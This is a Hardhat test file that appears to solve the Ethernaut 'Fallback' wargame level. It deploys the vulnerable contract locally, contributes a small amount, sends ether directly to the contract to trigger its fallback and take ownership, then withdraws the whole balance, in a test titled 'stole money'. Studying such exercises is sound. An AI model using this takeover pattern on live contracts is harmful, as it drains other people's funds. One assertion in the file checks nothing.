import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { BigNumber, Contract } from "ethers"
import { ethers } from "hardhat"
import { Fallback, Fallback__factory } from "../typechain"

xdescribe("Fallback",()=> {
    let FallbackFactory:Fallback__factory
    let fallback:Fallback
    let accounts:SignerWithAddress[]
    before(async()=>{
        accounts = await ethers.getSigners()
        FallbackFactory = await ethers.getContractFactory("Fallback")
        fallback = await FallbackFactory.deploy()
        await fallback.deployed()
    })

    it("stole money", async()=>{

        await fallback.connect(accounts[1]).contribute({value: 1000})
        expect(await fallback.owner() == fallback.address)
        let tx = {
            to:fallback.address,
            value:ethers.utils.parseEther("0.001")
        }
        await accounts[1].sendTransaction(tx)
        expect(await fallback.owner()).to.equal(accounts[1].address)
        await fallback.connect(accounts[1]).withdraw()
        expect(await ethers.provider.getBalance(fallback.address)).to.equal(BigNumber.from(0))
    })
})